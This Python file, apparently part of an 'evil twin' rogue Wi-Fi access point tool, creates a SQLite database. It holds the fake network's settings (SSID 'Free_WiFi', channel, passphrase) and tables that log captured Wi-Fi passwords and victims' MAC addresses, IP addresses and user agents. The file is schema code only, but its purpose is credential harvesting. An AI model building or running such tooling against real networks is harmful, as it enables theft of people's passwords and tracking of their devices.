# init_db.py
import sqlite3

def init_database():
    conn = sqlite3.connect('evil_twin.db')
    cursor = conn.cursor()
    
    # 创建表
    cursor.execute('''CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        evil_ssid TEXT NOT NULL DEFAULT 'Free_WiFi',
        evil_channel INTEGER DEFAULT 6,
        network_interface TEXT NOT NULL DEFAULT 'wlan0',
        evil_passphrase TEXT NOT NULL DEFAULT '12345678',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    for col, default in [
        ('network_interface', "'wlan0'"),
        ('evil_passphrase', "'12345678'"),
    ]:
        try:
            cursor.execute(f"ALTER TABLE config ADD COLUMN {col} TEXT NOT NULL DEFAULT {default}")
        except:
            pass
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS password_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        password TEXT NOT NULL,
        bssid TEXT,
        captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS mac_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        mac_address TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # 创建触发器
    cursor.execute('''DROP TRIGGER IF EXISTS limit_password_logs''')
    cursor.execute('''CREATE TRIGGER limit_password_logs 
        AFTER INSERT ON password_logs
        BEGIN
            DELETE FROM password_logs 
            WHERE id NOT IN (
                SELECT id FROM password_logs 
                ORDER BY captured_at DESC 
                LIMIT 10
            );
        END''')
    
    # 初始化默认配置
    cursor.execute("INSERT OR IGNORE INTO config (id, evil_ssid, evil_channel) VALUES (1, 'Free_WiFi', 6)")
    
    conn.commit()
    conn.close()
    print("Database initialized successfully!")

if __name__ == '__main__':
    init_database()
